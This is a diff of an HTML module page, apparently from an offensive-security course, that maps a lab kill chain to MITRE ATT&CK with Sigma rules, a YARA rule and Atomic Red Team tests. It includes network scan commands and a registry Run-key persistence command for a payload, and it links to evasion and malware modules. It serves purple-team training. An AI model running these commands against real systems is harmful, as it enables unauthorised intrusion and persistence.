@@ -13,6 +13,8 @@
             --dim: #666;
             --border: #333;
             --neon: #00ffff;
+            --purple: #ff00ff;
+            --amber: #ffaa00;
         }
         * { margin: 0; padding: 0; box-sizing: border-box; }
         body {
@@ -23,7 +25,8 @@
         }
         .container { max-width: 1200px; margin: 0 auto; padding: 2rem; }
         h1 { color: var(--accent); border-bottom: 2px solid var(--accent); padding-bottom: 0.5rem; margin-bottom: 1rem; }
-        h2 { color: var(--accent2); margin: 1.5rem 0 0.5rem; }
+        h2 { color: var(--accent2); margin: 2rem 0 0.5rem; border-bottom: 1px solid var(--border); padding-bottom: 0.3rem; }
+        h3 { color: var(--neon); margin: 1.5rem 0 0.5rem; }
         .code-block {
             background: #1a1a2e;
             border-left: 4px solid var(--accent);
@@ -33,7 +36,21 @@
             overflow-x: auto;
             font-family: Consolas, monospace;
             font-size: 13px;
+            position: relative;
         }
+        .copy-btn {
+            position: absolute;
+            top: 0.5rem;
+            right: 0.5rem;
+            background: var(--accent);
+            color: var(--bg);
+            border: none;
+            padding: 0.2rem 0.6rem;
+            border-radius: 4px;
+            font-size: 0.7rem;
+            cursor: pointer;
+        }
+        .copy-btn:hover { background: #ff5555; }
         .evidence-box {
             background: #1a0a0a;
             border: 2px solid var(--accent);
@@ -146,6 +163,188 @@
             font-weight: bold;
         }
         button:hover { background: #ff5555; }
+        .neon-highlight {
+            color: var(--neon);
+            text-shadow: 0 0 10px var(--neon);
+            font-weight: bold;
+        }
+        .neon-purple {
+            color: var(--purple);
+            text-shadow: 0 0 10px var(--purple);
+            font-weight: bold;
+        }
+        .neon-amber {
+            color: var(--amber);
+            text-shadow: 0 0 10px var(--amber);
+            font-weight: bold;
+        }
+        .cross-link {
+            background: rgba(0, 255, 255, 0.1);
+            border: 1px solid var(--neon);
+            border-radius: 4px;
+            padding: 0.5rem 1rem;
+            margin: 0.5rem 0;
+            display: inline-block;
+            color: var(--neon);
+            text-decoration: none;
+        }
+        .cross-link:hover {
+            background: rgba(0, 255, 255, 0.2);
+        }
+        .method-card {
+            background: #0f0f15;
+            border: 2px solid var(--border);
+            border-radius: 8px;
+            padding: 1.5rem;
+            margin: 1rem 0;
+            transition: border-color 0.3s;
+        }
+        .method-card:hover {
+            border-color: var(--accent);
+        }
+        .method-card h4 {
+            color: var(--accent);
+            margin-bottom: 0.5rem;
+            font-size: 1.1rem;
+        }
+        .difficulty {
+            display: inline-block;
+            padding: 0.1rem 0.5rem;
+            border-radius: 4px;
+            font-size: 0.75rem;
+            margin-left: 0.5rem;
+        }
+        .diff-easy { background: #0a3a0a; color: var(--accent2); }
+        .diff-medium { background: #3a3a0a; color: var(--amber); }
+        .diff-hard { background: #3a0a0a; color: var(--accent); }
+        .technique-grid {
+            display: grid;
+            grid-template-columns: repeat(auto-fit, minmax(300px, 1fr));
+            gap: 1rem;
+            margin: 1.5rem 0;
+        }
+        .quiz-container {
+            background: #0f0f15;
+            border: 2px solid var(--purple);
+            border-radius: 8px;
+            padding: 1.5rem;
+            margin: 1.5rem 0;
+        }
+        .quiz-option {
+            background: #1a1a2e;
+            border: 1px solid var(--border);
+            border-radius: 4px;
+            padding: 0.8rem 1rem;
+            margin: 0.5rem 0;
+            cursor: pointer;
+            transition: all 0.2s;
+        }
+        .quiz-option:hover {
+            border-color: var(--neon);
+            background: #1a1a3e;
+        }
+        .quiz-option.correct {
+            border-color: var(--accent2);
+            background: #0a2a0a;
+        }
+        .quiz-option.wrong {
+            border-color: var(--accent);
+            background: #2a0a0a;
+        }
+        .quiz-feedback {
+            margin-top: 1rem;
+            padding: 1rem;
+            border-radius: 4px;
+            display: none;
+        }
+        .quiz-feedback.show { display: block; }
+        .quiz-feedback.correct { background: #0a2a0a; border: 1px solid var(--accent2); }
+        .quiz-feedback.wrong { background: #2a0a0a; border: 1px solid var(--accent); }
+        table {
+            width: 100%;
+            border-collapse: collapse;
+            margin: 1rem 0;
+        }
+        th, td {
+            padding: 0.5rem;
+            text-align: left;
+            border-bottom: 1px solid var(--border);
+        }
+        th { color: var(--neon); font-weight: bold; }
+        .mitre-matrix {
+            display: grid;
+            grid-template-columns: repeat(auto-fit, minmax(200px, 1fr));
+            gap: 0.5rem;
+            margin: 1.5rem 0;
+        }
+        .mitre-tactic {
+            background: #0f0f15;
+            border: 1px solid var(--border);
+            border-radius: 8px;
+            padding: 1rem;
+        }
+        .mitre-tactic h5 { color: var(--accent2); margin-bottom: 0.5rem; }
+        .mitre-tactic .technique { color: var(--dim); font-size: 0.85rem; margin: 0.2rem 0; }
+        .sigma-rule {
+            background: #0a0a1a;
+            border: 1px solid var(--neon);
+            border-radius: 8px;
+            padding: 1rem;
+            margin: 1rem 0;
+            font-family: Consolas, monospace;
+            font-size: 12px;
+            overflow-x: auto;
+        }
+        .yara-rule {
+            background: #1a0a1a;
+            border: 1px solid var(--purple);
+            border-radius: 8px;
+            padding: 1rem;
+            margin: 1rem 0;
+            font-family: Consolas, monospace;
+            font-size: 12px;
+            overflow-x: auto;
+        }
+        .purple-section {
+            background: #0f0a1f;
+            border: 2px solid var(--purple);
+            border-radius: 8px;
+            padding: 1.5rem;
+            margin: 1.5rem 0;
+        }
+        .purple-section h3 { color: var(--purple); margin-bottom: 0.5rem; }
+        .atomic-test {
+            background: #0a1a0a;
+            border: 1px solid var(--accent2);
+            border-radius: 8px;
+            padding: 1rem;
+            margin: 1rem 0;
+        }
+        .atomic-test h5 { color: var(--accent2); margin-bottom: 0.5rem; }
+        .detection-card {
+            background: #0a0a1a;
+            border: 1px solid var(--neon);
+            border-radius: 8px;
+            padding: 1rem;
+            margin: 1rem 0;
+        }
+        .detection-card h5 { color: var(--neon); margin-bottom: 0.5rem; }
+        .threat-intel {
+            background: #1a0a0a;
+            border: 1px solid var(--accent);
+            border-radius: 8px;
+            padding: 1rem;
+            margin: 1rem 0;
+        }
+        .threat-intel h5 { color: var(--accent); margin-bottom: 0.5rem; }
+        .ttp-mapping {
+            background: #0f0f15;
+            border: 1px solid var(--border);
+            border-radius: 8px;
+            padding: 1rem;
+            margin: 1rem 0;
+        }
+        .ttp-mapping h5 { color: var(--amber); margin-bottom: 0.5rem; }
     </style>
 </head>
 <body>
@@ -159,94 +358,749 @@
         <h1>Module 20: Full Kill Chain <span class="status-badge status-live">LIVE TESTED</span></h1>
         
         <div class="progress-bar"><div class="progress-fill"></div></div>
-        <p style="color: var(--dim); font-size: 0.9rem;">Module 20 of 22 — From recon to domain admin in 10 steps</p>
+        <p style="color: var(--dim); font-size: 0.9rem;">Module 20 of 22 — From recon to domain admin: MITRE ATT&CK, TTPs, detection engineering, and purple teaming</p>
 
         <div class="first-principle">
             <h3>🧠 The Core Truth</h3>
-            <p>A kill chain is not a checklist — it's a <strong>decision tree</strong>. At each step, you gather intelligence, make a decision, and execute. If the decision fails, you pivot. If it succeeds, you advance. The chain is not linear; it's a maze with multiple exits. This module documents a real 10-step kill chain executed on our lab network, with every decision, every pivot, and every result.</p>
+            <p>A kill chain is not a checklist — it's a <strong>decision tree</strong>. At each step, you gather intelligence, make a decision, and execute. If the decision fails, you pivot. If it succeeds, you advance. The chain is not linear; it's a maze with multiple exits. This module documents a real kill chain executed on our lab network, maps every technique to <span class="neon-highlight">MITRE ATT&CK</span>, builds detection rules for each phase, and teaches you to think like both attacker <em>and</em> defender.</p>
+            <p style="margin-top: 1rem;"><strong>Why this matters:</strong> Understanding the kill chain from both sides — red <em>and</em> blue — is what separates script kiddies from operators. You must know how to detect what you deploy, and how to evade what you detect. This is <span class="neon-purple">purple teaming</span>.</p>
         </div>
 
         <div class="layman-term">
             <h4>🎯 Soldier Translation</h4>
-            <p>This is the full mission: reconnaissance, infiltration, escalation, persistence, lateral movement, and exfiltration. Every technique from previous modules, chained together in sequence. You are the special forces team. The target is the enterprise. The objective is total access. This is how it's done — step by step, with real evidence.</p>
+            <p>This is the full mission: reconnaissance, infiltration, escalation, persistence, lateral movement, and exfiltration. Every technique from previous modules, chained together in sequence. You are the special forces team. The target is the enterprise. The objective is total access. But now you also man the guard tower — you build the alarms, write the detection rules, and train the defenders to catch the next attacker.</p>
         </div>
 
-        <h2>The 10-Step Kill Chain</h2>
+        <h2>📚 Prerequisites — Cross-Linked to All Previous Modules</h2>
+        <p style="margin-bottom: 1rem;">This module synthesizes techniques from every prior module. Master these first:</p>
+        
+        <div class="technique-grid">
+            <div class="method-card">
+                <h4><a href="MODULE_01_NETWORKING.html" class="cross-link">Module 01: Networking</a></h4>
+                <p>TCP/IP, ports, protocols. The foundation of all reconnaissance and C2 communication.</p>
+            </div>
+            <div class="method-card">
+                <h4><a href="MODULE_02_RECON.html" class="cross-link">Module 02: Reconnaissance</a></h4>
+                <p>OSINT, network scanning, service enumeration. The first link in every kill chain.</p>
+            </div>
+            <div class="method-card">
+                <h4><a href="MODULE_03_POWERSHELL.html" class="cross-link">Module 03: PowerShell</a></h4>
+                <p>Windows automation, API calls, and living-off-the-land execution.</p>
+            </div>
+            <div class="method-card">
+                <h4><a href="MODULE_04_CODING_BASICS.html" class="cross-link">Module 04: Coding Basics</a></h4>
+                <p>C, Python, and assembly fundamentals for custom tooling.</p>
+            </div>
+            <div class="method-card">
+                <h4><a href="MODULE_05_SHELLCODE.html" class="cross-link">Module 05: Shellcode</a></h4>
+                <p>Position-independent code, encoders, and payload delivery.</p>
+            </div>
+            <div class="method-card">
+                <h4><a href="MODULE_06_MEMORY.html" class="cross-link">Module 06: Memory Forensics</a></h4>
+                <p>How Windows manages process memory. Essential for injection and detection.</p>
+            </div>
+            <div class="method-card">
+                <h4><a href="MODULE_07_REGISTRY.html" class="cross-link">Module 07: Registry</a></h4>
+                <p>Windows registry structure and persistence mechanisms.</p>
+            </div>
+            <div class="method-card">
+                <h4><a href="MODULE_08_PRIVESC.html" class="cross-link">Module 08: Privilege Escalation</a></h4>
+                <p>Token manipulation, UAC bypass, and SeDebugPrivilege.</p>
+            </div>
+            <div class="method-card">
+                <h4><a href="MODULE_09_MALWARE.html" class="cross-link">Module 09: Malware Development</a></h4>
+                <p>Payload design, evasion, and anti-analysis techniques.</p>
+            </div>
+            <div class="method-card">
+                <h4><a href="MODULE_10_CODE_INJECTION.html" class="cross-link">Module 10: Code Injection</a></h4>
+                <p>DLL injection, process hollowing, APC injection, and thread hijacking.</p>
+            </div>
+            <div class="method-card">
+                <h4><a href="MODULE_11_ROOTKITS.html" class="cross-link">Module 11: Rootkits</a></h4>
+                <p>Kernel-level persistence, SSDT hooking, and direct kernel object manipulation.</p>
+            </div>
+            <div class="method-card">
+                <h4><a href="MODULE_12_ETW_BYPASS.html" class="cross-link">Module 12: ETW Bypass</a></h4>
+                <p>Disabling Windows event tracing for stealth operation.</p>
+            </div>
+            <div class="method-card">
+                <h4><a href="MODULE_12_DEFENSIVE_VERIFY.html" class="cross-link">Module 12: Defensive Verification</a></h4>
+                <p>How EDR detects attacks. Understanding detection helps you evade it.</p>
+            </div>
+            <div class="method-card">
+                <h4><a href="MODULE_13_EDR_EVASION.html" class="cross-link">Module 13: EDR Evasion</a></h4>
+                <p>Advanced techniques for bypassing endpoint detection and response.</p>
+            </div>
+            <div class="method-card">
+                <h4><a href="MODULE_13_KAV_EVASION.html" class="cross-link">Module 13: KAV Evasion</a></h4>
+                <p>Kaspersky and antivirus bypass techniques.</p>
+            </div>
+            <div class="method-card">
+                <h4><a href="MODULE_14_CLOUD_FILES.html" class="cross-link">Module 14: Cloud Files</a></h4>
+                <p>Cloud storage exfiltration and data staging techniques.</p>
+            </div>
+            <div class="method-card">
+                <h4><a href="MODULE_15_LATERAL.html" class="cross-link">Module 15: Lateral Movement</a></h4>
+                <p>Pass-the-Hash, WMI, PSExec, and remote execution.</p>
+            </div>
+            <div class="method-card">
+                <h4><a href="MODULE_16_C2.html" class="cross-link">Module 16: C2</a></h4>
+                <p>Command and control infrastructure, beacons, and covert channels.</p>
+            </div>
+            <div class="method-card">
+                <h4><a href="MODULE_17_SOCIAL_ENGINEERING.html" class="cross-link">Module 17: Social Engineering</a></h4>
+                <p>Phishing, pretexting, and human-targeted initial access.</p>
+            </div>
+            <div class="method-card">
+                <h4><a href="MODULE_18_ANDROID.html" class="cross-link">Module 18: Android</a></h4>
+                <p>Mobile attack surface and Android-specific techniques.</p>
+            </div>
+            <div class="method-card">
+                <h4><a href="MODULE_19_AD.html" class="cross-link">Module 19: Active Directory</a></h4>
+                <p>Kerberoasting, BloodHound, and domain escalation.</p>
+            </div>
+            <div class="method-card">
+                <h4><a href="MODULE_21_CAPSTONE.html" class="cross-link">Module 21: Capstone</a></h4>
+                <p>Final integrated exercise combining all modules.</p>
+            </div>
+        </div>
+
+        <h2>🎯 MITRE ATT&CK Framework Overview</h2>
+        <p>The <span class="neon-highlight">MITRE ATT&CK</span> (Adversarial Tactics, Techniques, and Common Knowledge) framework is a globally-accessible knowledge base of adversary tactics and techniques based on real-world observations. Every technique in this kill chain maps to an ATT&CK ID.</p>
+
+        <div class="mitre-matrix">
+            <div class="mitre-tactic">
+                <h5>Reconnaissance (TA0043)</h5>
+                <div class="technique">T1593: Search Open Websites/Domains</div>
+                <div class="technique">T1594: Search Victim-Owned Websites</div>
+                <div class="technique">T1590: Gather Victim Network Info</div>
+                <div class="technique">T1595: Active Scanning</div>
+            </div>
+            <div class="mitre-tactic">
+                <h5>Resource Development (TA0042)</h5>
+                <div class="technique">T1587: Develop Capabilities</div>
+                <div class="technique">T1588: Obtain Capabilities</div>
+                <div class="technique">T1583: Acquire Infrastructure</div>
+            </div>
+            <div class="mitre-tactic">
+                <h5>Initial Access (TA0001)</h5>
+                <div class="technique">T1566: Phishing</div>
+                <div class="technique">T1078: Valid Accounts</div>
+                <div class="technique">T1190: Exploit Public-Facing App</div>
+                <div class="technique">T1133: External Remote Services</div>
+            </div>
+            <div class="mitre-tactic">
+                <h5>Execution (TA0002)</h5>
+                <div class="technique">T1059: Command and Scripting Interpreter</div>
+                <div class="technique">T1053: Scheduled Task/Job</div>
+                <div class="technique">T1047: Windows Management Instrumentation</div>
+                <div class="technique">T1203: Exploitation for Client Execution</div>
+            </div>
+            <div class="mitre-tactic">
+                <h5>Persistence (TA0003)</h5>
+                <div class="technique">T1547: Boot or Logon Autostart Execution</div>
+                <div class="technique">T1053: Scheduled Task/Job</div>
+                <div class="technique">T1543: Create or Modify System Process</div>
+                <div class="technique">T1546: Event Triggered Execution</div>
+            </div>
+            <div class="mitre-tactic">
+                <h5>Privilege Escalation (TA0004)</h5>
+                <div class="technique">T1068: Exploitation for Privilege Escalation</div>
+                <div class="technique">T1078: Valid Accounts</div>
+                <div class="technique">T1055: Process Injection</div>
+                <div class="technique">T1134: Access Token Manipulation</div>
+            </div>
+            <div class="mitre-tactic">
+                <h5>Defense Evasion (TA0005)</h5>
+                <div class="technique">T1562: Impair Defenses</div>
+                <div class="technique">T1027: Obfuscated Files or Information</div>
+                <div class="technique">T1055: Process Injection</div>
+                <div class="technique">T1218: Signed Binary Proxy Execution</div>
+            </div>
+            <div class="mitre-tactic">
+                <h5>Credential Access (TA0006)</h5>
+                <div class="technique">T1003: OS Credential Dumping</div>
+                <div class="technique">T1558: Steal or Forge Kerberos Tickets</div>
+                <div class="technique">T1110: Brute Force</div>
+                <div class="technique">T1552: Unsecured Credentials</div>
+            </div>
+            <div class="mitre-tactic">
+                <h5>Lateral Movement (TA0008)</h5>
+                <div class="technique">T1021: Remote Services</div>
+                <div class="technique">T1550: Use Alternate Authentication Material</div>
+                <div class="technique">T1047: Windows Management Instrumentation</div>
+                <div class="technique">T1210: Exploitation of Remote Services</div>
+            </div>
+            <div class="mitre-tactic">
+                <h5>Collection (TA0009)</h5>
+                <div class="technique">T1560: Archive Collected Data</div>
+                <div class="technique">T1005: Data from Local System</div>
+                <div class="technique">T1113: Screen Capture</div>
+                <div class="technique">T1056: Input Capture</div>
+            </div>
+            <div class="mitre-tactic">
+                <h5>Command and Control (TA0011)</h5>
+                <div class="technique">T1071: Application Layer Protocol</div>
+                <div class="technique">T1573: Encrypted Channel</div>
+                <div class="technique">T1105: Ingress Tool Transfer</div>
+                <div class="technique">T1095: Non-Application Layer Protocol</div>
+            </div>
+            <div class="mitre-tactic">
+                <h5>Exfiltration (TA0010)</h5>
+                <div class="technique">T1041: Exfiltration Over C2 Channel</div>
+                <div class="technique">T1048: Exfiltration Over Alternative Protocol</div>
+                <div class="technique">T1567: Exfiltration Over Web Service</div>
+                <div class="technique">T1020: Automated Exfiltration</div>
+            </div>
+            <div class="mitre-tactic">
+                <h5>Impact (TA0040)</h5>
+                <div class="technique">T1490: Inhibit System Recovery</div>
+                <div class="technique">T1486: Data Encrypted for Impact</div>
+                <div class="technique">T1491: Defacement</div>
+                <div class="technique">T1499: Endpoint Denial of Service</div>
+            </div>
+        </div>
+
+        <h2>⚔️ The 7-Phase Kill Chain (Lockheed Martin + ATT&CK)</h2>
+        <p>The classic <span class="neon-amber">Lockheed Martin Cyber Kill Chain</span> maps to MITRE ATT&CK tactics. Each phase below includes the offensive technique, defensive detection, and a Sigma rule for automated alerting.</p>
 
         <div class="kill-chain">
             <div class="chain-step">
                 <div>
-                    <h5>Step 1: Reconnaissance</h5>
-                    <p class="tactic">OSINT, network scanning, service enumeration</p>
+                    <h5>Phase 1: Reconnaissance</h5>
+                    <p class="tactic">OSINT, network scanning, service enumeration | ATT&CK: TA0043</p>
                 </div>
                 <span class="status">✅ LIVE</span>
             </div>
             <div class="chain-step">
                 <div>
-                    <h5>Step 2: Initial Access</h5>
-                    <p class="tactic">Phishing, credential harvesting, exploit</p>
+                    <h5>Phase 2: Weaponization</h5>
+                    <p class="tactic">Payload crafting, exploit bundling, delivery vehicle prep | ATT&CK: TA0042</p>
                 </div>
                 <span class="status">✅ LIVE</span>
             </div>
             <div class="chain-step">
                 <div>
-                    <h5>Step 3: Execution</h5>
-                    <p class="tactic">Payload delivery, process injection</p>
+                    <h5>Phase 3: Delivery</h5>
+                    <p class="tactic">Phishing, USB drop, remote service exploit | ATT&CK: TA0001</p>
                 </div>
                 <span class="status">✅ LIVE</span>
             </div>
             <div class="chain-step">
                 <div>
-                    <h5>Step 4: Persistence</h5>
-                    <p class="tactic">Registry, scheduled task, service</p>
+                    <h5>Phase 4: Exploitation</h5>
+                    <p class="tactic">Vulnerability trigger, shellcode execution, initial code run | ATT&CK: TA0002</p>
                 </div>
                 <span class="status">✅ LIVE</span>
             </div>
             <div class="chain-step">
                 <div>
-                    <h5>Step 5: Privilege Escalation</h5>
-                    <p class="tactic">Token impersonation, UAC bypass, exploit</p>
+                    <h5>Phase 5: Installation</h5>
+                    <p class="tactic">Persistence, backdoor, rootkit, service install | ATT&CK: TA0003</p>
                 </div>
                 <span class="status">✅ LIVE</span>
             </div>
             <div class="chain-step">
                 <div>
-                    <h5>Step 6: Defense Evasion</h5>
-                    <p class="tactic">AMSI bypass, ETW bypass, rootkit</p>
+                    <h5>Phase 6: Command & Control (C2)</h5>
+                    <p class="tactic">Beacon, encrypted channel, remote access maintenance | ATT&CK: TA0011</p>
                 </div>
                 <span class="status">✅ LIVE</span>
             </div>
             <div class="chain-step">
                 <div>
-                    <h5>Step 7: Credential Access</h5>
-                    <p class="tactic">LSASS dump, SAM extraction, Kerberoast</p>
-                </div>
-                <span class="status">✅ DEMONSTRATED</span>
-            </div>
-            <div class="chain-step">
-                <div>
-                    <h5>Step 8: Lateral Movement</h5>
-                    <p class="tactic">SSH, WMI, Pass-the-Hash, RDP</p>
-                </div>
-                <span class="status">✅ LIVE</span>
-            </div>
-            <div class="chain-step">
-                <div>
-                    <h5>Step 9: Collection</h5>
-                    <p class="tactic">File enumeration, database query, screenshot</p>
-                </div>
-                <span class="status">✅ LIVE</span>
-            </div>
-            <div class="chain-step">
-                <div>
-                    <h5>Step 10: Exfiltration</h5>
-                    <p class="tactic">C2 beacon, encrypted channel, dead drop</p>
+                    <h5>Phase 7: Actions on Objectives</h5>
+                    <p class="tactic">Data collection, lateral movement, exfiltration, impact | ATT&CK: TA0009, TA0010, TA0040</p>
                 </div>
                 <span class="status">✅ LIVE</span>
             </div>
         </div>
 
-        <h2>Live Execution: .92 to .42 to Domain Admin</h2>
+        <h2>🔬 Phase-by-Phase: TTP Mapping, Detection, and Defense</h2>
+
+        <h3>Phase 1: Reconnaissance</h3>
+        <div class="ttp-mapping">
+            <h5>Offensive TTPs</h5>
+            <p><strong>T1595.001:</strong> Scanning IP blocks with nmap, masscan</p>
+            <p><strong>T1590:</strong> Gathering victim network info via OSINT (LinkedIn, Shodan, certificate transparency logs)</p>
+            <p><strong>T1593:</strong> Searching open websites for email formats, tech stack, employee names</p>
+        </div>
+        <div class="detection-card">
+            <h5>Defensive Detection</h5>
+            <p>• <strong>Network:</strong> IDS alerts for port scans (Suricata rule 2002911)</p>
+            <p>• <strong>Endpoint:</strong> Unusual process spawning (nmap.exe, masscan.exe)</p>
+            <p>• <strong>DNS:</strong> Spike in external DNS queries for MX records, SPF lookups</p>
+        </div>
+
+        <div class="sigma-rule">
+<strong>Sigma Rule: Reconnaissance — Nmap Scan Detected</strong>
+title: Nmap Port Scan Detection
+status: stable
+logsource:
+    product: windows
+    service: security
+detection:
+    selection:
+        EventID: 5156
+        Application: '*\\nmap.exe'
+    condition: selection
+falsepositives:
+    - Authorized penetration testing
+level: medium
+tags:
+    - attack.discovery
+    - attack.t1046
+        </div>
+
+        <div class="atomic-test">
+            <h5>🧪 Atomic Red Team Test: T1046 — Network Service Scanning</h5>
+            <p>Simulates adversary reconnaissance to test detection coverage.</p>
+            <div class="code-block">
+# Atomic Test T1046 — Network Service Scanning
+# Requires: atomic-red-team framework
+
+Invoke-AtomicTest T1046 -TestNumbers 1
+
+# Manual equivalent:
+nmap -sS -p22,445,3389,5985 192.168.1.0/24
+masscan 192.168.1.0/24 -p0-65535 --rate=1000
+            </div>
+        </div>
+
+        <h3>Phase 2: Weaponization</h3>
+        <div class="ttp-mapping">
+            <h5>Offensive TTPs</h5>
+            <p><strong>T1587:</strong> Developing custom payloads (phantom_rpc.exe, shellcode)</p>
+            <p><strong>T1588:</strong> Obtaining commercial penetration testing tools (Cobalt Strike, Sliver)</p>
+            <p><strong>T1583:</strong> Acquiring C2 infrastructure (VPS, domain, CDN)</p>
+        </div>
+        <div class="detection-card">
+            <h5>Defensive Detection</h5>
+            <p>• <strong>Threat Intel:</strong> Monitor for your org's data on dark web markets</p>
+            <p>• <strong>Email:</strong> Track newly registered domains similar to your brand</p>
+            <p>• <strong>Supply Chain:</strong> Verify software hashes against known-good</p>
+        </div>
+
+        <div class="yara-rule">
+<strong>YARA Rule: Cobalt Strike Beacon Detection</strong>
+rule CobaltStrike_Beam {
+    meta:
+        description = "Detects Cobalt Strike beacon payload"
+        author = "22nd Survey Division"
+        date = "2026-06-29"
+    strings:
+        $a = { 4D 5A }  // MZ header
+        $b = "beacon.dll" nocase
+        $c = "ReflectiveLoader" nocase
+        $d = { 48 89 5C 24 08 48 89 74 24 10 57 48 83 EC 10 }
+    condition:
+        $a at 0 and any of ($b, $c, $d)
+}
+        </div>
+
+        <h3>Phase 3: Delivery</h3>
+        <div class="ttp-mapping">
+            <h5>Offensive TTPs</h5>
+            <p><strong>T1566.001:</strong> Spearphishing Attachment (malicious .doc with macro)</p>
+            <p><strong>T1566.002:</strong> Spearphishing Link (fake login page)</p>
+            <p><strong>T1190:</strong> Exploiting public-facing web application (RCE on IIS/Apache)</p>
+        </div>
+        <div class="detection-card">
+            <h5>Defensive Detection</h5>
+            <p>• <strong>Email Gateway:</strong> Block macros, executable attachments, suspicious URLs</p>
+            <p>• <strong>Web Proxy:</strong> Alert on newly registered domains, high-risk categories</p>
+            <p>• <strong>Endpoint:</strong> Office spawning cmd.exe, powershell.exe, or wscript.exe</p>
+        </div>
+
+        <div class="sigma-rule">
+<strong>Sigma Rule: Phishing Delivery — Office Spawning Shell</strong>
+title: Office Application Spawning Shell
+status: stable
+logsource:
+    product: windows
+    service: sysmon
+detection:
+    selection:
+        EventID: 1
+        ParentImage:
+            - '*\\winword.exe'
+            - '*\\excel.exe'
+            - '*\\powerpnt.exe'
+        Image:
+            - '*\\cmd.exe'
+            - '*\\powershell.exe'
+            - '*\\wscript.exe'
+            - '*\\cscript.exe'
+    condition: selection
+falsepositives:
+    - Legitimate IT automation
+level: high
+tags:
+    - attack.initial_access
+    - attack.t1566
+        </div>
+
+        <div class="atomic-test">
+            <h5>🧪 Atomic Red Team Test: T1566.001 — Spearphishing Attachment</h5>
+            <div class="code-block">
+# Atomic Test T1566.001 — Malicious Macro Execution
+Invoke-AtomicTest T1566.001 -TestNumbers 1
+
+# Manual: Create .doc with VBA macro that spawns calc.exe
+# This tests both email gateway AND endpoint detection
+            </div>
+        </div>
+
+        <h3>Phase 4: Exploitation</h3>
+        <div class="ttp-mapping">
+            <h5>Offensive TTPs</h5>
+            <p><strong>T1203:</strong> Exploitation for Client Execution (CVE-XXXX-XXXX in Office)</p>
+            <p><strong>T1059:</strong> Command and Scripting Interpreter (PowerShell, Python, cmd)</p>
+            <p><strong>T1055:</strong> Process Injection (DLL injection, process hollowing)</p>
+        </div>
+        <div class="detection-card">
+            <h5>Defensive Detection</h5>
+            <p>• <strong>Sysmon EID 8:</strong> CreateRemoteThread detected</p>
+            <p>• <strong>Sysmon EID 10:</strong> ProcessAccess with suspicious call trace</p>
+            <p>• <strong>AMSI:</strong> PowerShell script block logging</p>
+        </div>
+
+        <div class="sigma-rule">
+<strong>Sigma Rule: Process Injection — CreateRemoteThread</strong>
+title: Process Injection via CreateRemoteThread
+status: stable
+logsource:
+    product: windows
+    service: sysmon
+detection:
+    selection:
+        EventID: 8
+        TargetImage:
+            - '*\\lsass.exe'
+            - '*\\svchost.exe'
+            - '*\\explorer.exe'
+    condition: selection
+falsepositives:
+    - Legitimate debugging tools
+level: high
+tags:
+    - attack.defense_evasion
+    - attack.privilege_escalation
+    - attack.t1055
+        </div>
+
+        <div class="atomic-test">
+            <h5>🧪 Atomic Red Team Test: T1055 — Process Injection</h5>
+            <div class="code-block">
+# Atomic Test T1055 — Process Injection
+Invoke-AtomicTest T1055 -TestNumbers 1
+
+# Manual: Inject into notepad.exe using PowerShell
+# See Module 10 for full injection techniques
+            </div>
+        </div>
+
+        <h3>Phase 5: Installation (Persistence)</h3>
+        <div class="ttp-mapping">
+            <h5>Offensive TTPs</h5>
+            <p><strong>T1547.001:</strong> Registry Run Keys (HKLM\...\Run)</p>
+            <p><strong>T1053.005:</strong> Scheduled Task/Job (schtasks, at.exe)</p>
+            <p><strong>T1543.003:</strong> Create or Modify System Process (Windows Service)</p>
+            <p><strong>T1546:</strong> Event Triggered Execution (WMI event subscription)</p>
+        </div>
+        <div class="detection-card">
+            <h5>Defensive Detection</h5>
+            <p>• <strong>Sysmon EID 13:</strong> Registry value set (Run keys)</p>
+            <p>• <strong>Windows Event 4698:</strong> Scheduled task created</p>
+            <p>• <strong>Sysmon EID 19-21:</strong> WMI event subscription</p>
+        </div>
+
+        <div class="sigma-rule">
+<strong>Sigma Rule: Persistence — Registry Run Key Added</strong>
+title: Registry Run Key Added
+status: stable
+logsource:
+    product: windows
+    service: sysmon
+detection:
+    selection:
+        EventID: 13
+        TargetObject:
+            - '*\\Software\\Microsoft\\Windows\\CurrentVersion\\Run*'
+            - '*\\Software\\Microsoft\\Windows\\CurrentVersion\\RunOnce*'
+    condition: selection
+falsepositives:
+    - Legitimate software installers
+level: medium
+tags:
+    - attack.persistence
+    - attack.t1547.001
+        </div>
+
+        <div class="sigma-rule">
+<strong>Sigma Rule: Persistence — WMI Event Subscription</strong>
+title: WMI Event Subscription Created
+status: stable
+logsource:
+    product: windows
+    service: sysmon
+detection:
+    selection:
+        EventID:
+            - 19  // EventFilter
+            - 20  // Consumer
+            - 21  // Binding
+    condition: selection
+falsepositives:
+    - SCCM and legitimate WMI usage
+level: high
+tags:
+    - attack.persistence
+    - attack.t1546.003
+        </div>
+
+        <div class="atomic-test">
+            <h5>🧪 Atomic Red Team Test: T1547.001 — Registry Run Keys</h5>
+            <div class="code-block">
+# Atomic Test T1547.001 — Registry Run Keys
+Invoke-AtomicTest T1547.001 -TestNumbers 1
+
+# Manual:
+reg add "HKLM\Software\Microsoft\Windows\CurrentVersion\Run" \
+    /v SecurityUpdate /t REG_SZ /d "C:\temp\payload.exe" /f
+            </div>
+        </div>
+
+        <h3>Phase 6: Command & Control</h3>
+        <div class="ttp-mapping">
+            <h5>Offensive TTPs</h5>
+            <p><strong>T1071.001:</strong> Application Layer Protocol — Web (HTTP/HTTPS beacon)</p>
+            <p><strong>T1573:</strong> Encrypted Channel (TLS, custom crypto)</p>
+            <p><strong>T1105:</strong> Ingress Tool Transfer (downloading additional tools)</p>
+            <p><strong>T1095:</strong> Non-Application Layer Protocol (TCP/UDP raw sockets)</p>
+        </div>
+        <div class="detection-card">
+            <h5>Defensive Detection</h5>
+            <p>• <strong>Network:</strong> Beaconing detection (regular intervals, jitter analysis)</p>
+            <p>• <strong>DNS:</strong> DGA domain detection, high entropy queries</p>
+            <p>• <strong>Proxy:</strong> User-agent anomalies, URI path patterns</p>
+        </div>
+
+        <div class="sigma-rule">
+<strong>Sigma Rule: C2 Beaconing — Regular Connections</strong>
+title: Suspicious Regular Network Connections
+status: experimental
+logsource:
+    product: windows
+    service: sysmon
+detection:
+    selection:
+        EventID: 3
+        Initiated: true
+    timeframe: 15m
+    condition: selection | count() by DestinationIp > 10
+falsepositives:
+    - Cloud sync services
+    - Legitimate polling applications
+level: medium
+tags:
+    - attack.command_and_control
+    - attack.t1071
+        </div>
+
+        <div class="atomic-test">
+            <h5>🧪 Atomic Red Team Test: T1071 — Application Layer Protocol</h5>
+            <div class="code-block">
+# Atomic Test T1071 — C2 over HTTP
